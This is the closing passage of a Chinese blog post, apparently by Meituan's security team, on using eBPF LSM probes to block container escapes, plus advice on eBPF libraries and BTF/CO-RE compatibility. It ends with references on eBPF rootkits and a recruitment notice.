<p>eBPF在网络安全场景的使用，除了做入侵检测外，还可以用于防御。LSM PROBE hook提供了相关功能。以容器逃逸场景为例，行为最明显的特征是“父子进程”的Namespace不一致，子进程创建完成后，判断这个特征是否匹配，返回EPERM覆盖进程创建函数的返回值，从而起到防御的目的。相比内核模块等防御实现，eBPF实现更加安全、稳定、可靠，从而在源头上解决容器逃逸的问题。</p>
<p>同样，本文认为eBPF也是二进制层最优秀的虚拟补丁、热更新解决方案。</p>
<p><img src="https://p0.meituan.net/travelcube/d16b623e598dac835cd71f33583638d9319731.png" alt=""></p>
<div class="highlight"><pre tabindex="0" style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LSM_PROBE(bpf, <span style="color:#dc322f">int</span> cmd, <span style="color:#719e07">union</span> bpf_attr <span style="color:#719e07">*</span>attr, <span style="color:#dc322f">unsigned</span> <span style="color:#dc322f">int</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#719e07">return</span> <span style="color:#719e07">-</span>EPERM;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在系统的配置上有一定要求，CONFIG_BPF_LSM=y、CONFIG_LSM等配置内容，必须包含bpf等，详情可参考<a href="https://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#11-lsm-probes">BCC类库Demo lsm probe</a> 。</p>
<h2 id="工程实现">工程实现</h2>
<h3 id="练手">练手</h3>
<p>入门练手，可以尝试使用BCC的类库：<a href="https://github.com/iovisor/bcc">GitHub/BCC</a> ，以及C语言用户空间程序的各种Demo例子<a href="https://github.com/libbpf/libbpf-bootstrap">Demo BPF applications</a> 。</p>
<h3 id="类库选择">类库选择</h3>
<p>工程化时，对项目质量、稳定性、研发效率等都有要求，推荐Cilium的纯Go eBPF类库，由Cilium官方背书可放心使用。Datadog公司的Agent产品也是用这个类库。</p>
<p>本文的产品也是参考Datadog，抽象包装了Cilium的eBPF库，实现配置化便捷管理eBPF程序。GitHub仓库：<a href="https://github.com/ehids/ebpfmanager">ehids/ebpfmanager</a> ，欢迎大家使用。</p>
<p><img src="https://image.cnxct.com/2022/02/ehids-logo-1.png" alt=""></p>
<p>当然，也可以使用libbpf包装的Go类库实现，比如Tracee等产品。</p>
<h3 id="系统兼容性co-re">系统兼容性CO-RE</h3>
<p>eBPF的出现极大地简化了编写内核态代码的门槛，极高的安全性，友好的加载方式，高效的数据交互，令eBPF深受追捧。然而和编写传统内核模块相同，内核态的功能开发伴随着繁冗的适配测试工作，Linux繁多的内核版本更是让适配这件事难度陡增，这也就是BTF出现之前的很长一段时间里，bcc + clang + llvm被人们诟病的地方。程序在运行的时候，才进行编译，目标机器还得安装clang llvm kernel-header等编译环境，同时编译也会消耗大量CPU资源，这在某些高负载机器上是不能被接受的。</p>
<p>因此，BTF&amp;CO-RE横空出现，BTF可以理解为一种Debug符号描述方式，此前传统方式Debug信息会非常巨大，Linux内核一般会关闭Debug符号，BTF的出现解决了这一问题，大幅度减少Debug信息的大小，使得生产场景内核携带Debug信息成为可能。</p>
<p>可喜的是，通过运用BTF&amp;CO-RE这项技术，可以帮助开发者节省大量适配精力，但是这项技术目前还是在开发中，还有许多处理不了的场景，比如结构体成员被迁入子结构体中，这时候还是需要手动解决问题，BTF的开发者也写了一篇文章，讲解不同场景的处理方案<a href="https://nakryiko.com/posts/bpf-core-reference-guide/">bpf-core-reference-guide</a>。</p>
<h3 id="大型项目">大型项目</h3>
<p>在国外，云原生领域产品发展较快，涌现出一批批基于eBPF的产品，包括Cilium、<a href="https://www.cnxct.com/how-does-datadog-use-ebpf-in-runtime-security/">Datadog</a> 、Falco、Katran等，应用在网络编排、网络防火墙、跟踪定位、运行时安全等各个领域，可以借鉴这些大型项目的研发经验，来加快产品建设，包括多系统兼容、框架设计、项目质量、监控体系建设等。本篇以检测防御为主，工程建设相关经验，我们将在以后的文章中分享。</p>
<h2 id="总结">总结</h2>
<p>随着云原生快速发展，eBPF实现软件、运行环境会越来越多。而eBPF的恶意利用也会越来越普遍。从国内外的情况来看，国外对这个方向的研究远比国内超前，<strong>我们再次呼吁大家，网络安全产品应当尽快具备eBPF相关威胁检测能力</strong>。</p>
<p>本文跟大家探讨了基于eBPF技术的恶意利用与检测机制，其中提到的eBPF在防御检测产品研发、工程建设等内容，我们将在下一篇跟大家分享，敬请期待。</p>
<h2 id="作者简介">作者简介</h2>
<p>陈驰、杨一、鑫博，均来自美团信息安全部。</p>
<h2 id="参考文献">参考文献</h2>
<ul>
<li><a href="https://www.youtube.com/watch?v=g6SKWT7sROQ">Creating and Countering the Next Generation of Linux Rootkits</a></li>
<li><a href="https://www.youtube.com/watch?v=5zixNDolLrg">DEFCON 29 - eBPF, I thought we were friends</a></li>
<li><a href="https://github.com/ehids/slide">eBPF的各种技术应用PDF集合</a></li>
<li><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/">Offensive BPF: Malicious bpftrace</a></li>
<li><a href="https://blog.tofile.dev/2021/08/01/bad-bpf.html">Bad BPF - Warping reality using eBPF</a></li>
<li><a href="https://facebookmicrosites.github.io/bpf/blog/2018/08/31/object-lifetime.html">Lifetime of BPF objects</a></li>
<li><a href="https://arthurchiao.art/blog/bpf-advanced-notes-1-zh">BPF程序（BPF Prog）类型详解：使用场景、函数签名、执行位置及程序示例</a></li>
<li><a href="https://qmonnet.github.io/whirl-offload/2021/09/23/bpftool-features-thread/">Features of bpftool: the thread of tips and examples to work with eBPF objects</a></li>
<li><a href="https://blogs.blackberry.com/en/2021/12/reverse-engineering-ebpfkit-rootkit-with-blackberrys-free-ida-processor-tool">Reverse Engineering Ebpfkit Rootkit With BlackBerry’s Enhanced IDA Processor Tool</a></li>
<li><a href="https://image.cnxct.com/2021/12/path-defcon29-ebpf.pdf">Creating and countering the next generation of Linux rootkits using eBPF</a></li>
<li><a href="https://www.kernel.org/doc/html/latest/userspace-api/ebpf/syscall.html">eBPF Syscall</a></li>
<li><a href="https://www.cnxct.com/how-does-cilium-use-ebpf-with-go-and-c/?=xawxgzh">Cilium eBPF实现机制源码分析</a></li>
<li><a href="https://github.com/Gui774ume/ebpfkit">ebpfkit is a rootkit powered by eBPF</a></li>
</ul>
<h2 id="招聘">招聘</h2>
<p>美团信息安全部招聘研发专家，职位如下：</p>
<ul>
<li>安全研发专家（主机安全方向）</li>
<li>安全研发专家（RASP方向）</li>
<li>Web研发架构师（Java语言）</li>
</ul>
<p>具体描述参见：<a href="https://mp.weixin.qq.com/s/Q5ITJogko-fnAgDH_JqISg">美团信息安全部2022年招聘岗位</a> 。欢迎大家加入我们，跟我们一起构筑安全屏障，守护大家的安全。</p>

		</div>

		<div class="post-tags">
			
				
					<nav class="nav tags">
							<ul class="flat">
								
								<li><a href="/tags/%E7%BE%8E%E5%9B%A2%E6%8A%80%E6%9C%AF%E5%9B%A2%E9%98%9F">美团技术团队</a></li>
								
								<li><a href="/tags/%E5%9F%BA%E7%A1%80%E7%A0%94%E5%8F%91%E5%B9%B3%E5%8F%B0">基础研发平台</a></li>
								
								<li><a href="/tags/%E8%BF%90%E7%BB%B4">运维</a></li>
								
								<li><a href="/tags/%E5%AE%89%E5%85%A8">安全</a></li>
								
								<li><a href="/tags/ebpf">eBPF</a></li>
								
								<li><a href="/tags/linux">Linux</a></li>
								
								<li><a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F">云原生</a></li>
								
								<li><a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8">网络安全</a></li>
								
							</ul>
					</nav>
				
			
		</div>
		<div id="disqus_thread"></div>
<script type="text/javascript">
	(function () {
		
		
		if (window.location.hostname == "localhost")
			return;

		var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
		var disqus_shortname = 'wfsui';
		dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
		(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
	})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
		Disqus.</a></noscript>
<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>
	<div class="footer wrapper">
	<nav class="nav">
		<div> © Copyright notice |  <a href="">Wfsui theme</a> | Built with <a href="https://gohugo.io">Hugo</a></div>
	</nav>
</div><script>feather.replace()</script>
</body>
</html>
